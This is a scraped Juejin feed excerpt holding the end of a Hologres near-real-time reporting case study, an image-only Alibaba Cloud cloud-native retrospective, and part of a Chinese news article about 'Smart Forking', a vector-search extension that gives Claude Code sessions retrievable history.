<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6560c040b15b4ab08c681b7d4d972736~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=GtPtU9Scu4x9pkTbt2cDNonSqY8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f3b61e853424b6aa4970d788d4f9bb1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=%2BagDyfuFOIjfPYjluI1mxdGCe%2FE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">近实时报表构建</h3>
<h4 data-id="heading-8">业务背景</h4>
<p>数据看板的时效性越高，越能帮助运营及时发现问题，快速进行决策和业务调整。价格力团队内部分场景的报表数据原通过ODPS离线调度实现更新，但运营期望能有近实时分钟级数据。</p>
<h4 data-id="heading-9">解决方案</h4>
<p><strong>数据分层构建：</strong> 基于Hologres Dynamic Table实现ODS → DWD → DWS → ADS数据架构的近实时化改造</p>
<p><strong>增量刷新策略：</strong> 采用动态表<strong>增量刷新</strong>机制，设置<strong>分钟级</strong>刷新间隔，实现近实时数据更新，并<strong>分钟级保存历史数据</strong>。</p>
<p><strong>资源隔离保障：</strong> 通过使用Hologres <strong>Serverless</strong>资源减少与其他任务的资源竞争。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a87b86b760474381b4c44f16a4691658~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=tU4pln1t58DhWXq6Z%2BdFGeR65W0%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-10">应用效果</h4>
<p><strong>应用效果：</strong> 成功解决了数据看板的时效性痛点，<strong>亿级底表数据，输入RPS 1W</strong>的处理时延从<strong>小时级降低至分钟级</strong>，可以灵活比对<strong>任意分钟数据的同比</strong>，双十一期间为运营团队提供了及时可靠的数据支撑。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bcd8de4380d4603a3e899e73abeef32~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=8wsdzhxait7Ayd%2FYq2LIz4GcWcQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73d182719d1544b6852b2b375c970461~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=f%2FDXIcScPGHFYyAVEGk%2Fgh8B0zI%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[云原生为基，AI为翼：回望阿里云云原生的2025年]]></title>    <link>https://juejin.cn/post/7597250364124938303</link>    <guid>https://juejin.cn/post/7597250364124938303</guid>    <pubDate>2026-01-20T10:30:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597250364124938303" data-draft-id="7597271614941626387" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="云原生为基，AI为翼：回望阿里云云原生的2025年"/> <meta itemprop="keywords" content="云原生"/> <meta itemprop="datePublished" content="2026-01-20T10:30:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云云原生"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            云原生为基，AI为翼：回望阿里云云原生的2025年
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云云原生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:30:07.000Z" title="Tue Jan 20 2026 10:30:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7458501d8f5b471f8f70e779cf3ef2d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=Zgg4xTH4y6h5WQ8hgei6kPSqAAo%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9c3cc19ba7e4bd58670827e88eacd8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=BC5PWcJCQBUNlOimpE6x1%2F9H7Og%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58a206f69cfa48b2a2883ff274e5cc7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=O03EaG3%2FshyKQtpo1NmpMidVtYM%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b1315a17a7f42b19c4b2792a6fd89d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=UUlWhn3qPG1tkOhAsF8sR6K8hmU%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67d14f2437d1480e9704e8c6bd9cf428~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=w7%2FM0VBvU3QwfoykqXbYjS%2BLKks%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dc24fa1afd1413981c82c75f6dcfde6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=b9OiEakzHbVacNaspS03vwZ86%2Fs%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5868baf86edb4e52a410d5c36e493c1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=VjTQyFJeh6zVtAyX5uckDknGxRs%3D" alt="图片" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[刚刚，Claude 实现「永久记忆」！官方还没上线，大神已玩疯]]></title>    <link>https://juejin.cn/post/7597125475601661979</link>    <guid>https://juejin.cn/post/7597125475601661979</guid>    <pubDate>2026-01-20T10:31:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475601661979" data-draft-id="7596998306381840434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="刚刚，Claude 实现「永久记忆」！官方还没上线，大神已玩疯"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-20T10:31:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            刚刚，Claude 实现「永久记忆」！官方还没上线，大神已玩疯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:31:23.000Z" title="Tue Jan 20 2026 10:31:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/102ab693a8a24b69bdcc4fd725803c7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=s29CLjK9DcfHy4jYtbRoi68HxhI%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】昨天，Claude 刚刚被曝要有永久记忆，今天就被开发者抢先一步。一个叫 Smart Forking 的扩展，让大模型首次拥有「长期记忆」，无需重头解释。开发者圈沸腾了：难以置信，它真的能跑！」</strong></h5>
<p>昨天，一篇 Claude 要获得永久记忆的爆料，震惊整个 AI 圈。</p>
<p>这种「知识库」的全新记忆方式，<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI3MTA0MTk1MA%3D%3D%26mid%3D2652665767%26idx%3D1%26sn%3D1935acf8bbe45fbd5e6caf15d4703a32%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzI3MTA0MTk1MA==&amp;mid=2652665767&amp;idx=1&amp;sn=1935acf8bbe45fbd5e6caf15d4703a32&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">可以让 Claude 在自己的永存大脑中，自动记住一切</a>。</p>
<p>巧的是，就在今天，就有开发者抢先「截胡」。他在现有工具上实现了一个扩展能力——Smart Forking detection，让大模型第一次拥有了「可继承的长期记忆」！</p>
<p>这个所谓的 Smart Forking，通过给 Claude Code 会话嵌入向量数据库，让它能从成百上千次的历史对话中，找到最相关的前文。</p>
<p>因此，你不必再重新解释，Claude 可以直接「接上文」搞开发了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9627a2403a2e41ee9938ff26ca25cf60~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=Zyv9aArusK2CCJmUY%2Bd0G8MqsU8%3D" alt="" loading="lazy"/></p>
<p>这个功能一出，开发者社区直接炸锅了。大家纷纷表示：「不敢相信，它居然真的跑起来了！」「这一刻，我是真的被震撼到了。」</p>
<p>强烈推荐每一个 Claude Code 用户，都把这个思路直接加入自己的工作流！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f909824d5d4842b8af0e2c877f73b003~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=jC9gfpKRO8c928UCxoI11T9ALfk%3D" alt="" loading="lazy"/></p>
<p>英雄所见略同，但路径不同。当官方还在设计永久记忆的形态时，开发者已经用 Smart Forking，提前过上了「Claude 有长期记忆」的生活。</p>
<p>而且，最近这个一天甩出一个王炸的节奏，实在太震撼了。2026 开年这一个月，Anthropic 真是名副其实的硅谷新 GOAT，在开发者圈拥有无上的影响力。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25071c5db09942edb5703dbbeafa0fb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=qPlSbcR0w0KCPdJ%2F1dJ4tyNxcCA%3D" alt="" loading="lazy"/></p>
<p><strong>「让大模型「拥有」长期记忆」</strong></p>
<p>跟昨天 Anthropic 被曝的官方知识库相比，今天这个功能不仅有演示，还有技术细节。</p>
<p>你有没有遇到过这种情况：想在一个已有项目里加新功能，但完全不想再从头解释一遍背景？</p>
<p>那有没有可能利用起在成百上千次 Claude Code 对话中积累的知识呢？</p>
<p>毕竟，一个对话里包含的有效上下文越多，Claude 实现需求的效果就越好。怎样才能让这些宝贵的上下文信息，不要白白浪费了？</p>
<p>这位开发者想到一个办法——smart forking（智能分叉）！</p>
<p>只需要调用 <code>/fork-detect</code> 命令，告诉它你现在想做什么，Claude 就会把你的需求送进嵌入模型；然后，和一个**「包含你所有历史聊天记录的 RAG 向量数据库」**进行匹配（而且，这个数据库会随着你新的会话自动更新）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/391859f566f04d82b7998b341990ebf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=0xka7pIdx8fsV%2FaIh%2B%2BSW6KqQGw%3D" alt="" loading="lazy"/></p>
<p>接着，它会返回一个**「与你当前需求最相关的前 5 个历史会话」**，并为每一个打上相关度评分，从高到低排序。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f4b3e15feda4504a1f79c8a7c43fd0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=Pz2ZS4GZJqaPazf%2F2o3YmX82zd4%3D" alt="" loading="lazy"/></p>
<p>你只需要选一个最合适的会话，它就会直接给你一条 fork 命令，复制、粘贴到新的终端里。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24a5b1fdcf094f88bf1c704633036a8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=ZCXt10oLN%2FzNrJTOSgySGqmXabk%3D" alt="" loading="lazy"/></p>
<p>这样，你就能在最合适的上下文中，无缝继续开发了。功能实现，从此变得异常丝滑！</p>
<p><strong>「<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcc9a77e30fa4590b088e5d304cc7de7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=PF5gJB2Bcy242XNC035Pvc9ufnw%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「实测体验：成功率 100%」</strong></p>
<p>这样看来，Smart Forking，本质上是给大模型外挂了一套「记忆系统」。</p>
<p>当然，如果要严谨一点说，Smart Forking 并没有改变模型的记忆机制，而是通过向量检索，把历史上下文变成了一种外置的长期记忆。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8588539edf334930886be6d9162ac63a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=omPRyq%2FbH6I1LHXecngl4kXGvwk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a898bfe4cd594e55beae8a7e790801a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=rMm7BoAL4jzz3ZWulT7qDxuHwYI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96ad7ed13e7d4530971d214f77052158~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=ZCTJgnik4rcKeGGfy3R1qRSIbgI%3D" alt="" loading="lazy"/></p>
